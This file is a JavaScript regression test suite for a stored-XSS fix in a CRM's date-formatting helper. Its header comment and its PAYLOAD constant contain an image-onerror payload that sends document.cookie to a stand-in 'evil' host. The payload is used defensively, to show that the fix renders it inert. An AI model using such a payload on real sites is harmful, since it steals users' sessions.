/* A date that cannot be parsed is echoed into innerHTML, so it must be escaped.
 *
 * gwDateFormat deliberately falls back to the RAW STORED VALUE for anything it
 * cannot parse — "a malformed date should show as itself, not blank out the row
 * it is in" (public/js/gw_date.js). That is the right call for a date function.
 *
 * The problem is what the callers do with it. All 17 _p5FmtDate call sites in
 * app_premium.js interpolate the result straight into innerHTML, and one of
 * them renders `clients.since` — a FREE-TEXT input (app_premium.js:5462,
 * placeholder "Jan 2025"), not a date picker, stored as TEXT by
 * migrations/0019_customer_detail.sql. So the fallback path is attacker
 * controlled:
 *
 *   <span class="cd-since">Since <img src=x onerror=fetch('//evil/?c='+document.cookie)></span>
 *
 * — stored XSS in an authenticated CRM, executing for every user who opens that
 * client. On that very line `client.name` and `client.status` ARE escapeHtml'd,
 * so the omission was an oversight rather than a decision.
 *
 * Only the FALLBACK is escaped. A successfully formatted date comes out of Intl
 * from a parsed Date and contains nothing to escape, so escaping it would be a
 * no-op — and would double-escape at the two call sites that already escape
 * (_pqRow and _listRow escape their `sub` argument).
 *
 * Run: node --test tests/date-render-escaping.test.mjs
 */
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import test from 'node:test';

const appSource = readFileSync(new URL('../public/js/app_premium.js', import.meta.url), 'utf8');
const gwSource = readFileSync(new URL('../public/js/gw_date.js', import.meta.url), 'utf8');

function region(source, startMarker, endMarker, label) {
  const start = source.indexOf(startMarker);
  assert.ok(start >= 0, `anchor "${startMarker}" is gone — ${label} needs repointing`);
  const end = source.indexOf(endMarker, start + startMarker.length);
  assert.ok(end > start, `end anchor for ${label} is gone`);
  return source.slice(start, end);
}

// The real functions, out of the real files — never a stub.
const escapeHtmlSrc = region(appSource, 'function escapeHtml', '\nfunction ', 'escapeHtml');
const fmtDateSrc = region(appSource, 'function _p5FmtDate', '\nfunction ', '_p5FmtDate');

/*
 * gw_date.js is an IIFE that assigns onto `window`, so simply concatenating it
 * does NOT put bare `gwDateFormat` / `gwDateParse` in scope. The first version
 * of this harness did exactly that, which meant _p5FmtDate took its
 * `typeof gwDateFormat !== 'function'` branch and XS-01/XS-02 passed while
 * exercising the load-failure path instead of the real one — they survived a
 * mutation that deleted the fix. Destructuring the names into this scope makes
 * the bare identifiers resolve the way they do in the browser.
 */
function build() {
  return new Function('window', `
    ${gwSource}
    const { gwDateParse, gwDateFormat } = window.gwDate;
    ${escapeHtmlSrc}
    ${fmtDateSrc}
    return _p5FmtDate;
  `)({});
}
const _p5FmtDate = build();

test('XS-00 the harness really has the parser in scope', () => {
  // Guards the trap above: if this fails, every assertion below is testing the
  // gw_date.js-is-missing branch and proves nothing about normal operation.
  assert.equal(_p5FmtDate('2026-09-01'), 'Sep 1, 2026');
});

const PAYLOAD = `<img src=x onerror=fetch('//evil/?c='+document.cookie)>`;

test('XS-01 an unparseable date is escaped, not echoed into innerHTML', () => {
  const out = _p5FmtDate(PAYLOAD);
  assert.doesNotMatch(out, /<img/, 'the raw tag reached the page');
  assert.match(out, /&lt;img/);
  // The handler TEXT survives, and that is fine: with < and > escaped the whole
  // thing is inert text content, not an element. What must not survive is any
  // character that could start a tag or close an attribute.
  assert.doesNotMatch(out, /[<>]/, 'a tag delimiter survived unescaped');
});

test('XS-02 every character that can break out of an attribute or element is escaped', () => {
  for (const [raw, expected] of [
    ['<', '&lt;'], ['>', '&gt;'], ['"', '&quot;'], ["'", '&#039;'],
  ]) {
    const out = _p5FmtDate(`x${raw}y`);
    assert.ok(out.includes(expected), `${raw} was not escaped (got ${out})`);
    assert.ok(!out.includes(raw), `${raw} survived unescaped (got ${out})`);
  }
});

test('XS-03 a real date is untouched, so the two escaping call sites do not double-escape', () => {
  // _pqRow and _listRow escapeHtml their `sub` argument. If _p5FmtDate escaped
  // unconditionally, a formatted date would pass through two escapes. It never
  // contains a special character, so this stays a no-op — but pin it, because
  // the day a locale introduces one, double-escaping shows up as visible
  // entities in the UI.
  const out = _p5FmtDate('2026-09-01');
  assert.doesNotMatch(out, /&(amp|lt|gt|quot|#039);/, `formatted date was escaped: ${out}`);
  assert.match(out, /2026/);
});

test('XS-04 shapes the parser refuses still render, and still safely', () => {
  // gwDateParse refuses '2026-02-30' and '2026' — both now take the raw path,
  // which is exactly why this fix matters more after that change than before.
  for (const value of ['2026-02-30', '2026', '2026-09', '   ']) {
    const out = _p5FmtDate(value);
    assert.doesNotMatch(out, /[<>]/, `${value} rendered unescaped markup`);
  }
});

test('XS-05 an empty value is still the em dash, not an escaped empty string', () => {
  assert.equal(_p5FmtDate(null), '—');
  assert.equal(_p5FmtDate(''), '—');
});

test('XS-06 every _p5FmtDate call site is inside an escaping context or the helper escapes', () => {
  // The helper is the choke point precisely because the call sites are not
  // individually guarded — 17 of them, 15 interpolating with no escapeHtml.
  // If someone reverts the helper, this says why that is not safe.
  const guarded = /const parsed = \(typeof gwDateParse === 'function'\) \? gwDateParse\(d\) : null;[\s\S]{0,120}escapeHtml\(out\)/;
  assert.match(
    fmtDateSrc, guarded,
    '_p5FmtDate no longer escapes its raw fallback, but its call sites still ' +
    'interpolate the result into innerHTML unescaped — see this file\'s header',
  );
});
